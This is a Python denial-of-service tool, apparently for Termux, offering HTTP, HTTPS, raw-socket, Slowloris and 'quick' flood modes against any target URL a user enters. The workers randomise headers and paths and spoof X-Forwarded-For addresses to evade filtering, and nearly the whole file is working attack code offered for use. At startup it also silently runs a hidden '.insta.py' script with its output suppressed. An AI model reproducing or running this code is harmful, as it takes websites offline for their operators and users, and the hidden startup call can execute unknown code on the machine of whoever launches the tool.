import asyncio
import aiohttp
import sys
import os
import time
import random
import socket
import ssl
import signal
import json
import ipaddress
import urllib.parse
import subprocess
from datetime import datetime
from threading import Thread, Lock, Event
from concurrent.futures import ThreadPoolExecutor
os.system("clear")
print("FOLLOW ON INSTAGRAM...")
time.sleep(0.1)

current_dir = os.path.dirname(os.path.abspath(__file__))
insta_script = os.path.join(current_dir, ".insta.py")

try:
    subprocess.run(
        [sys.executable, insta_script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True
    )
except Exception as e:
    pass

# 4. Clear screen for a fresh start
os.system("clear")
# Colors for Termux
class C:
    R = '\033[91m'     # Red
    G = '\033[92m'     # Green
    Y = '\033[93m'     # Yellow
    B = '\033[94m'     # Blue
    M = '\033[95m'     # Magenta
    C = '\033[96m'     # Cyan
    W = '\033[97m'     # White
    GR = '\033[90m'    # Gray
    N = '\033[0m'      # Reset
    BG_R = '\033[41m'  # Red BG
    BG_G = '\033[42m'  # Green BG
    BG_Y = '\033[43m'  # Yellow BG
    BG_B = '\033[44m'  # Blue BG
    BD = '\033[1m'     # Bold
    DM = '\033[2m'     # Dim
    # Red gradient (dark → bright)
    R1 = '\033[38;5;88m'   # Dark red
    R2 = '\033[38;5;124m'  # Medium-dark red
    R3 = '\033[38;5;160m'  # Red
    R4 = '\033[38;5;196m'  # Bright red
    R5 = '\033[38;5;197m'  # Bright red (slight pink)
    R6 = '\033[38;5;198m'  # Lighter red
    R7 = '\033[38;5;199m'  # Light red
    R8 = '\033[38;5;200m'  # Very light red

# ===== LOGO =====
LOGO = f"""
{C.R1}{C.BD}        ▄████████  ████████▄    ▄██████▄   ▄████████ {C.N}
{C.R2}{C.BD}       ███    ███  ███    ███  ███    ███ ███    ███ {C.N}
{C.R3}{C.BD}       ███    ███  ███    ███  ███    ███ ███    █▀  {C.N}
{C.R4}{C.BD}       ███    ███  ███    ███  ███    ███ ▀██████████▄ {C.N}
{C.R5}{C.BD}     ▀███████████  ███    ███  ███    ███          ███ {C.N}
{C.R6}{C.BD}       ███    ███  ███    ███  ███    ███          ███ {C.N}
{C.R7}{C.BD}       ███    ███  ███    ███  ███    ███    ▄█    ███ {C.N}
{C.R8}{C.BD}       ███    █▀   ████████▀    ▀██████▀   ▄████████▀  {C.N}
                                                                    @alphinux7"""

# User-Agents
USER_AGENTS = [
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(530,537)}.{random.randint(0,36)} (KHTML, like Gecko) Chrome/{random.randint(110,125)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Safari/{random.randint(530,537)}.{random.randint(0,36)}",
    f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/{random.randint(530,537)}.{random.randint(0,36)} (KHTML, like Gecko) Chrome/{random.randint(110,125)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Safari/{random.randint(530,537)}.{random.randint(0,36)}",
    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(13,15)}_{random.randint(0,7)}) AppleWebKit/{random.randint(600,608)}.{random.randint(1,5)}.{random.randint(10,20)} (KHTML, like Gecko) Version/{random.randint(15,18)}.{random.randint(0,2)} Safari/{random.randint(600,608)}.{random.randint(1,5)}.{random.randint(10,20)}",
    f"Mozilla/5.0 (Linux; Android {random.randint(11,15)}; Pixel {random.randint(6,9)}) AppleWebKit/{random.randint(530,537)}.{random.randint(0,36)} (KHTML, like Gecko) Chrome/{random.randint(110,125)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Mobile Safari/{random.randint(530,537)}.{random.randint(0,36)}",
    f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,18)}_{random.randint(0,6)}_{random.randint(0,1)} like Mac OS X) AppleWebKit/{random.randint(600,608)}.{random.randint(1,5)}.{random.randint(10,20)} (KHTML, like Gecko) Version/{random.randint(15,18)}.{random.randint(0,2)} Mobile/15E148 Safari/{random.randint(600,608)}.{random.randint(1,5)}.{random.randint(10,20)}",
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(100,130)}.0) Gecko/20100101 Firefox/{random.randint(100,130)}.0",
    f"Mozilla/5.0 (X11; Linux x86_64; rv:{random.randint(100,130)}.0) Gecko/20100101 Firefox/{random.randint(100,130)}.0",
    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{random.randint(13,15)}; rv:{random.randint(100,130)}.0) Gecko/20100101 Firefox/{random.randint(100,130)}.0",
    f"Mozilla/5.0 (Linux; Android {random.randint(11,15)}; SM-G9{random.randint(80,98)}{random.randint(0,1)}) AppleWebKit/{random.randint(530,537)}.{random.randint(0,36)} (KHTML, like Gecko) Chrome/{random.randint(110,125)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Mobile Safari/{random.randint(530,537)}.{random.randint(0,36)}",
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(530,537)}.{random.randint(0,36)} (KHTML, like Gecko) Chrome/{random.randint(110,125)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Safari/{random.randint(530,537)}.{random.randint(0,36)} Edg/{random.randint(110,120)}.0.{random.randint(2000,2100)}.{random.randint(50,100)}",
] * 30

REFERRERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://www.facebook.com/", "https://twitter.com/", "https://www.reddit.com/",
    "https://www.instagram.com/", "https://www.linkedin.com/", "https://t.co/",
    "https://www.youtube.com/", "https://github.com/", "",
]

PATHS = [
    "/", "/index.html", "/index.php", "/home", "/login", "/admin", "/api/v1/",
    "/search", "/about", "/contact", "/products", "/blog", "/news", "/support",
    "/help", "/faq", "/docs", "/download", "/wp-admin", "/wp-login.php",
    "/robots.txt", "/sitemap.xml", "/.env", "/.git/config",
] + [f"/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(4,12)))}" for _ in range(100)]

# ===== GLOBAL STATE =====
stats = {
    "total": 0, "ok": 0, "fail": 0, "sent": 0, "recv": 0, "start": 0
}
stats_lock = Lock()
stop_event = Event()
attack_active = False

# ===== MENU & UI =====

def print_banner():
    os.system('clear')
    print(LOGO)
    print(f"{C.GR}{'─'*66}{C.N}")
def print_menu():
    print(f"{C.C}{C.BD}[Select Attack Mode]{C.N}")
    print(f"{C.G}[1]{C.N} {C.W}HTTP Flood{C.N}       — Async HTTP/1.1 With Randomized Headers")
    print(f"{C.G}[2]{C.N} {C.W}HTTPS Flood{C.N}      — Encrypted TLS Flood")
    print(f"{C.G}[3]{C.N} {C.W}Raw Socket Flood{C.N} — Raw TCP Sockets")
    print(f"{C.G}[4]{C.N} {C.W}Slowloris{C.N}        — Slow Headers to Exhaust Server Connections")
    print(f"{C.G}[5]{C.N} {C.W}Quick Attack{C.N}     — HTTP Mode • 200 Threads • 60s Duration")
    print(f"{C.G}[0]{C.N} {C.R}Exit{C.N}")
    print(f"{C.GR}{'─'*66}{C.N}")

def get_input(prompt_text, default=None, input_type=str):
    """Get user input with color."""
    while True:
        try:
            p = f" {C.G}>>{C.N} {C.W}{prompt_text}{C.N}"
            if default is not None:
                p += f" {C.GR}(default: {default}){C.N}"
            p += f": {C.G}"
            val = input(p)
            print(C.N, end='')
            if not val and default is not None:
                return default
            if input_type == int:
                return int(val)
            return val
        except ValueError:
            print(f" {C.R}[!] Invalid Input Error!{C.N}")
        except KeyboardInterrupt:
            print(f"\n {C.R}[!] Exiting...{C.N}")
            sys.exit(0)

def show_config(url, threads, port, timeout, mode, duration):
    """Display attack configuration."""
    mode_names = {1: "HTTP Flood", 2: "HTTPS Flood", 3: "Raw Socket", 4: "Slowloris", 5: "Quick Attack (HTTP)"}
    print(f"\n {C.C}{C.BD}[ ATTACK CONFIGURATION ]{C.N}\n")
    print(f"   {C.Y}Target URL:{C.N}    {C.W}{url}{C.N}")
    print(f"   {C.Y}Mode:{C.N}         {C.M}{mode_names.get(mode, 'Unknown')}{C.N}")
    print(f"   {C.Y}Threads:{C.N}      {C.W}{threads:,}{C.N}")
    print(f"   {C.Y}Port:{C.N}         {C.W}{port}{C.N}")
    print(f"   {C.Y}Timeout:{C.N}      {C.W}{timeout}s{C.N}")
    print(f"   {C.Y}Duration:{C.N}     {C.W}{duration if duration > 0 else 'Unlimited'}s{C.N}")
    print(f"\n {C.GR}{'─'*58}{C.N}")

    confirm = get_input("Start Attack?", default="y")
    return confirm.lower() in ('y', 'yes', '')

# ===== URL PARSING =====
def parse_target(url_string, override_port=None):
    parsed = urllib.parse.urlparse(url_string)
    if not parsed.scheme:
        url_string = f"http://{url_string}"
        parsed = urllib.parse.urlparse(url_string)

    scheme = parsed.scheme.lower()
    host = parsed.netloc.split(":")[0]

    port_map = {"http": 80, "https": 443}
    if ":" in parsed.netloc:
        port = int(parsed.netloc.split(":")[1])
    else:
        port = port_map.get(scheme, 80)

    if override_port and override_port > 0:
        port = override_port

    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query

    return {
        "scheme": scheme, "host": host, "port": port,
        "path": path, "url": url_string, "ip": None
    }

def resolve_target(target):
    try:
        ip = socket.gethostbyname(target["host"])
        target["ip"] = ip
        return ip
    except socket.gaierror:
        return None

# ===== PROGRESS SPINNER =====
class Spinner:
    def __init__(self):
        self.chars = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
        self.i = 0

    def next(self):
        c = self.chars[self.i % len(self.chars)]
        self.i += 1
        return c

# ===== ATTACK WORKERS =====

async def http_worker(session, target, threads, timeout, sem):
    """HTTP flood worker."""
    global attack_active
    while attack_active and not stop_event.is_set():
        async with sem:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": random.choice(["text/html,*/*", "application/json,*/*", "*/*"]),
                    "Accept-Language": random.choice(["en-US,en;q=0.9", "fr;q=0.9", "de;q=0.9", "ja;q=0.9"]),
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Upgrade-Insecure-Requests": "1",
                }

                if random.random() > 0.4:
                    headers["Referer"] = random.choice(REFERRERS)

                path = target["path"]
                if random.random() > 0.5:
                    path = random.choice(PATHS)

                # Cache buster
                if random.random() > 0.6:
                    sep = "&" if "?" in path else "?"
                    path += f"{sep}_={random.randint(100000,999999)}"

                # Spoof IP
                if random.random() > 0.5:
                    fip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                    headers["X-Forwarded-For"] = fip
                    headers["X-Real-IP"] = fip

                full_url = f"{target['scheme']}://{target['host']}:{target['port']}{path}"

                async with session.get(full_url, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    ssl=False, allow_redirects=False) as resp:
                    await resp.read()

                with stats_lock:
                    stats["total"] += 1
                    stats["ok"] += 1
                    stats["sent"] += len(str(headers))

            except Exception:
                with stats_lock:
                    stats["total"] += 1
                    stats["fail"] += 1

async def raw_worker(target, threads, timeout, sem):
    """Raw socket flood worker."""
    global attack_active
    while attack_active and not stop_event.is_set():
        async with sem:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)

                if target['scheme'] == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=target['host'])

                sock.connect((target['host'], target['port']))

                path = target['path']
                if random.random() > 0.5:
                    path = random.choice(PATHS)

                req = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target['host']}:{target['port']}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )

                sock.send(req.encode())
                try:
                    sock.recv(4096)
                except:
                    pass

                with stats_lock:
                    stats["total"] += 1
                    stats["ok"] += 1
                    stats["sent"] += len(req)

            except Exception:
                with stats_lock:
                    stats["total"] += 1
                    stats["fail"] += 1
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass

async def slowloris_worker(target, threads, timeout, sem):
    """Slowloris worker — holds connections open with partial headers."""
    global attack_active
    while attack_active and not stop_event.is_set():
        async with sem:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        target['host'], target['port'],
                        ssl=(target['scheme'] == 'https')
                    ), timeout=timeout
                )

                path = random.choice(PATHS)
                writer.write(f"GET {path} HTTP/1.1\r\nHost: {target['host']}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                await writer.drain()

                # Send headers slowly
                for _ in range(500):
                    if not attack_active or stop_event.is_set():
                        break
                    hdr = f"X-{random.randint(1000,9999)}: {random.randint(100000,999999)}\r\n"
                    writer.write(hdr.encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(3, 10))

                writer.close()

                with stats_lock:
                    stats["total"] += 1
                    stats["ok"] += 1
            except Exception:
                with stats_lock:
                    stats["total"] += 1
                    stats["fail"] += 1

# ===== ATTACK COORDINATOR =====

async def run_attack(target, threads, timeout, mode):
    """Run the attack with real-time progress and percentage."""
    global attack_active
    attack_active = True
    stop_event.clear()

    sem = asyncio.Semaphore(threads * 5)
    tasks = []
    spinner = Spinner()

    start_time = time.time()

    if mode in (1, 5):  # HTTP
        connector = aiohttp.TCPConnector(
            limit=threads * 5, limit_per_host=threads * 5,
            ttl_dns_cache=0, force_close=False, ssl=False
        )
        async with aiohttp.ClientSession(connector=connector) as session:
            for _ in range(threads):
                tasks.append(asyncio.create_task(http_worker(session, target, threads, timeout, sem)))

            # Progress display loop
            while attack_active and not stop_event.is_set():
                with stats_lock:
                    t = stats["total"]
                    o = stats["ok"]
                    f = stats["fail"]
                    s = stats["sent"]

                elapsed = time.time() - start_time
                rps = t / elapsed if elapsed > 0 else 0

                # Estimate progress (fake cap at 99% unless we have duration)
                pct = min(99, int((elapsed % 60) / 60 * 100)) if t > 0 else 0

                bar_len = 25
                filled = int(bar_len * pct / 100)
                bar = f"{C.G}{'█'*filled}{C.GR}{'░'*(bar_len-filled)}{C.N}"

                sys.stdout.write(f"\033[2K\033[1A" * 6)

                print(f"\n {C.C}{C.BD} ═══════════════════════════════════════════════════════{C.N}")
                print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Attacking on:{C.N}{C.W}{target['url'][:45]}{C.N}{' '*(45-len(target['url'][:45]))}{C.C}{C.BD}{C.N}")
                print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Target IP:{C.N}   {C.W}{target['ip'] or 'N/A':<38}{C.N} {C.C}{C.BD}{C.N}")
                print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Mode:{C.N}        {C.M}{['HTTP','HTTPS','RAW SOCKET','SLOWLORIS','HTTP QUICK'][mode-1]:<38}{C.N} {C.C}{C.BD}{C.N}")
                print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Threads:{C.N}     {C.W}{threads:<8}{C.N} {C.GR}│{C.N} {C.R}{C.BD}TIMEOUT:{C.N} {C.W}{timeout}s{' '*(31-len(str(timeout)))}{C.N} {C.C}{C.BD}{C.N}")
                print(f" {C.C}{C.BD} ═══════════════════════════════════════════════════════{C.N}")
                print(f"\n {C.C}Progress:{C.N}  {bar}  {C.Y}{pct}%{C.N}")
                print(f" {C.C}Requests:{C.N}   {C.W}{t:>8,}{C.N}  {C.G}OK: {o:>6,}{C.N}  {C.R}FAIL: {f:>6,}{C.N}  {C.M}RPS: {rps:>6,.0f}{C.N}")
                print(f" {C.C}Sent:{C.N}      {C.W}{s/1024/1024:>6.1f} MB{C.N}  {C.C}Elapsed:{C.N} {C.W}{elapsed:>5.0f}s{C.N}  {C.GR}[Ctrl+C to stop]{C.N}")
                print(f"\n {C.DM}{' '*40}{C.N}  {spinner.next()}")

                await asyncio.sleep(0.5)

    elif mode == 2:  # HTTPS
        connector = aiohttp.TCPConnector(
            limit=threads * 5, limit_per_host=threads * 5,
            ttl_dns_cache=0, force_close=False, ssl=False
        )
        async with aiohttp.ClientSession(connector=connector) as session:
            for _ in range(threads):
                tasks.append(asyncio.create_task(http_worker(session, target, threads, timeout, sem)))

            while attack_active and not stop_event.is_set():
                with stats_lock:
                    t = stats["total"]
                    o = stats["ok"]
                    f = stats["fail"]
                    s = stats["sent"]

                elapsed = time.time() - start_time
                rps = t / elapsed if elapsed > 0 else 0
                pct = min(99, int((elapsed % 60) / 60 * 100)) if t > 0 else 0

                bar_len = 25
                filled = int(bar_len * pct / 100)
                bar = f"{C.G}{'█'*filled}{C.GR}{'░'*(bar_len-filled)}{C.N}"

                sys.stdout.write(f"\033[2K\033[1A" * 7)

                print(f"\n {C.C}{C.BD} ═══════════════════════════════════════════════════════{C.N}")
                print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Attacking on:{C.N} {C.W}{target['url'][:45]}{C.N}{' '*(45-len(target['url'][:45]))} {C.C}{C.BD}{C.N}")
                print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Target IP:{C.N}   {C.W}{target['ip'] or 'N/A':<38}{C.N} {C.C}{C.BD}{C.N}")
                print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Mode:{C.N}        {C.M}{['HTTP','HTTPS','RAW SOCKET','SLOWLORIS','HTTP QUICK'][mode-1]:<38}{C.N} {C.C}{C.BD}{C.N}")
                print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Threads:{C.N}     {C.W}{threads:<8}{C.N} {C.GR}│{C.N} {C.R}{C.BD}TIMEOUT:{C.N} {C.W}{timeout}s{' '*(31-len(str(timeout)))}{C.N} {C.C}{C.BD}{C.N}")
                print(f" {C.C}{C.BD}═══════════════════════════════════════════════════════{C.N}")
                print(f"\n {C.C}Progress:{C.N}  {bar}  {C.Y}{pct}%{C.N}")
                print(f" {C.C}Requests:{C.N}   {C.W}{t:>8,}{C.N}  {C.G}OK: {o:>6,}{C.N}  {C.R}FAIL: {f:>6,}{C.N}  {C.M}RPS: {rps:>6,.0f}{C.N}")
                print(f" {C.C}Sent:{C.N}      {C.W}{s/1024/1024:>6.1f} MB{C.N}  {C.C}Elapsed:{C.N} {C.W}{elapsed:>5.0f}s{C.N}  {C.GR}[Ctrl+C to stop]{C.N}")
                print(f"\n {C.DM}{' '*40}{C.N}  {spinner.next()}")

                await asyncio.sleep(0.5)

    elif mode == 3:  # Raw
        for _ in range(threads):
            tasks.append(asyncio.create_task(raw_worker(target, threads, timeout, sem)))

        while attack_active and not stop_event.is_set():
            with stats_lock:
                t = stats["total"]
                o = stats["ok"]
                f = stats["fail"]
                s = stats["sent"]

            elapsed = time.time() - start_time
            rps = t / elapsed if elapsed > 0 else 0
            pct = min(99, int((elapsed % 60) / 60 * 100)) if t > 0 else 0

            bar_len = 25
            filled = int(bar_len * pct / 100)
            bar = f"{C.G}{'█'*filled}{C.GR}{'░'*(bar_len-filled)}{C.N}"

            sys.stdout.write(f"\033[2K\033[1A" * 7)

            print(f"\n {C.C}{C.BD} ═══════════════════════════════════════════════════════{C.N}")
            print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Attacking on:{C.N} {C.W}{target['url'][:45]}{C.N}{' '*(45-len(target['url'][:45]))} {C.C}{C.BD}{C.N}")
            print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Target IP:{C.N}   {C.W}{target['ip'] or 'N/A':<38}{C.N} {C.C}{C.BD}{C.N}")
            print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Mode:{C.N}        {C.M}{['HTTP','HTTPS','RAW SOCKET','SLOWLORIS','HTTP QUICK'][mode-1]:<38}{C.N} {C.C}{C.BD}{C.N}")
            print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Threads:{C.N}     {C.W}{threads:<8}{C.N} {C.GR}│{C.N} {C.R}{C.BD}TIMEOUT:{C.N} {C.W}{timeout}s{' '*(31-len(str(timeout)))}{C.N} {C.C}{C.BD}{C.N}")
            print(f" {C.C}{C.BD}═══════════════════════════════════════════════════════{C.N}")
            print(f"\n {C.C}Progress:{C.N}  {bar}  {C.Y}{pct}%{C.N}")
            print(f" {C.C}Requests:{C.N}   {C.W}{t:>8,}{C.N}  {C.G}OK: {o:>6,}{C.N}  {C.R}FAIL: {f:>6,}{C.N}  {C.M}RPS: {rps:>6,.0f}{C.N}")
            print(f" {C.C}Sent:{C.N}      {C.W}{s/1024/1024:>6.1f} MB{C.N}  {C.C}Elapsed:{C.N} {C.W}{elapsed:>5.0f}s{C.N}  {C.GR}[Ctrl+C to stop]{C.N}")
            print(f"\n {C.DM}{' '*40}{C.N}  {spinner.next()}")

            await asyncio.sleep(0.5)

    elif mode == 4:  # Slowloris
        max_slow = min(threads, 300)
        for _ in range(max_slow):
            tasks.append(asyncio.create_task(slowloris_worker(target, threads, timeout, sem)))

        while attack_active and not stop_event.is_set():
            with stats_lock:
                t = stats["total"]
                o = stats["ok"]
                f = stats["fail"]
                s = stats["sent"]

            elapsed = time.time() - start_time
            rps = t / elapsed if elapsed > 0 else 0
            pct = min(99, int((elapsed % 60) / 60 * 100)) if t > 0 else 0

            bar_len = 25
            filled = int(bar_len * pct / 100)
            bar = f"{C.G}{'█'*filled}{C.GR}{'░'*(bar_len-filled)}{C.N}"

            sys.stdout.write(f"\033[2K\033[1A" * 7)

            print(f"\n {C.C}{C.BD}═══════════════════════════════════════════════════════{C.N}")
            print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Attacking on:{C.N} {C.W}{target['url'][:45]}{C.N}{' '*(45-len(target['url'][:45]))} {C.C}{C.BD}{C.N}")
            print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Target IP:{C.N}   {C.W}{target['ip'] or 'N/A':<38}{C.N} {C.C}{C.BD}{C.N}")
            print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Mode:{C.N}        {C.M}SLOWLORIS{' '*(29)}{C.N} {C.C}{C.BD}{C.N}")
            print(f" {C.C}{C.BD} {C.N}  {C.R}{C.BD}Connections:{C.N}{C.W}{max_slow:<6}{C.N} {C.GR}│{C.N} {C.R}{C.BD}TIMEOUT:{C.N} {C.W}{timeout}s{' '*(31-len(str(timeout)))}{C.N} {C.C}{C.BD}{C.N}")
            print(f" {C.C}{C.BD}═══════════════════════════════════════════════════════{C.N}")
            print(f"\n {C.C}Progress:{C.N}  {bar}  {C.Y}{pct}%{C.N}")
            print(f" {C.C}Requests:{C.N}   {C.W}{t:>8,}{C.N}  {C.G}OK: {o:>6,}{C.N}  {C.R}FAIL: {f:>6,}{C.N}  {C.M}RPS: {rps:>6,.0f}{C.N}")
            print(f" {C.C}Sent:{C.N}      {C.W}{s/1024/1024:>6.1f} MB{C.N}  {C.C}Elapsed:{C.N} {C.W}{elapsed:>5.0f}s{C.N}  {C.GR}[Ctrl+C to stop]{C.N}")
            print(f"\n {C.DM}{' '*40}{C.N}  {spinner.next()}")

            await asyncio.sleep(0.5)

    # Cleanup: cancel all tasks
    for task in tasks:
        task.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)
    attack_active = False

    # Print final stats
    with stats_lock:
        t = stats["total"]
        o = stats["ok"]
        f = stats["fail"]
        s = stats["sent"]

    elapsed = time.time() - start_time
    rps = t / elapsed if elapsed > 0 else 0
    rate = (o / t * 100) if t > 0 else 0

    print(f"\n {C.C}{C.BD}╔══════════════════════════════════════════════════════╗{C.N}")
    print(f" {C.C}{C.BD}║{C.N}           {C.R}{C.BD}Attack Complete — Final Statistics{C.N}         {C.C}{C.BD}║{C.N}")
    print(f" {C.C}{C.BD}╚══════════════════════════════════════════════════════╝{C.N}")
    print(f"   {C.Y}Duration:{C.N}      {C.W}{elapsed:.1f}s{C.N}")
    print(f"   {C.Y}Total Requests:{C.N}{C.W} {t:>12,}{C.N}")
    print(f"   {C.G}Successful:{C.N}    {C.G}{o:>12,}{C.N}")
    print(f"   {C.R}Failed:{C.N}        {C.R}{f:>12,}{C.N}")
    print(f"   {C.M}Avg RPS:{C.N}       {C.M}{rps:>12,.0f}{C.N}")
    print(f"   {C.C}Success Rate:{C.N}  {C.C}{rate:>11.1f}%{C.N}")
    print(f"   {C.Y}Data Sent:{C.N}     {C.W}{s/1024/1024:>8.2f} MB{C.N}")
    print(f" {C.GR}{'─'*58}{C.N}\n")

# ===== SIGNAL HANDLER =====

def signal_handler(sig, frame):
    """Immediate Ctrl+C handler — kills attack right away."""
    global attack_active
    if attack_active:
        print(f"\n\n {C.R}{C.BD}[!] Stopping Attack...{C.N}")
        attack_active = False
        stop_event.set()
    else:
        print(f"\n\n {C.R}[!] Exiting...{C.N}")
        sys.exit(0)

# ===== MAIN =====

def main():
    signal.signal(signal.SIGINT, signal_handler)

    while True:
        print_banner()
        print_menu()

        try:
            choice = get_input("Select Option", input_type=int)
        except:
            continue

        if choice == 0:
            print(f"\n {C.R}[!] Exiting...{C.N}")
            sys.exit(0)

        if choice not in (1, 2, 3, 4, 5):
            print(f"\n {C.R}[!] Invalid Option Error!{C.N}")
            time.sleep(1)
            continue

        # Get target URL
        target_url = get_input("Enter Target URL: ")

        # Resolve target
        target = parse_target(target_url)
        print(f"\n {C.Y}[*] Resolving {target['host']}...{C.N}", end='')
        ip = resolve_target(target)
        if not ip:
            print(f" {C.R}[FAILED]{C.N}")
            print(f" {C.R}[!] Could not resolve hostname: {target['host']}{C.N}")
            time.sleep(1)
            continue
        print(f" {C.G}[{ip}]{C.N}")

        if choice == 5:
            # Quick attack — defaults
            threads = 200
            port = target['port']
            timeout = 5
            duration = 60
        else:
            # Get user params
            threads = get_input("Threads", default=200, input_type=int)
            port = get_input(f"Port (auto: {target['port']})", default=target['port'], input_type=int)
            timeout = get_input("Timeout(in sec)", default=5, input_type=int)
            duration = get_input("Duration (0=unlimited)", default=0, input_type=int)

        if threads < 1 or threads > 5000:
            print(f" {C.R}[!] Threads must be between 1-5000{C.N}")
            time.sleep(1)
            continue

        target['port'] = port

        # Show config and confirm
        if not show_config(target_url, threads, port, timeout, choice, duration):
            print(f" {C.Y}[!] Attack cancelled...{C.N}")
            time.sleep(1)
            continue

        # Reset stats
        with stats_lock:
            for k in stats:
                stats[k] = 0
            stats["start"] = time.time()

        # Run attack
        try:
            if duration > 0:
                asyncio.run(asyncio.wait_for(
                    run_attack(target, threads, timeout, choice),
                    timeout=duration
                ))
            else:
                asyncio.run(run_attack(target, threads, timeout, choice))
        except asyncio.TimeoutError:
            attack_active = False
            stop_event.set()
            print(f"\n {C.Y}[!] Duration Reached..({duration}s). Stopping...{C.N}")
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"\n {C.R}[!] Error: {e}{C.N}")

        input(f"\n {C.GR}[Press Enter to Continue...]{C.N}")

if __name__ == "__main__":
    main()
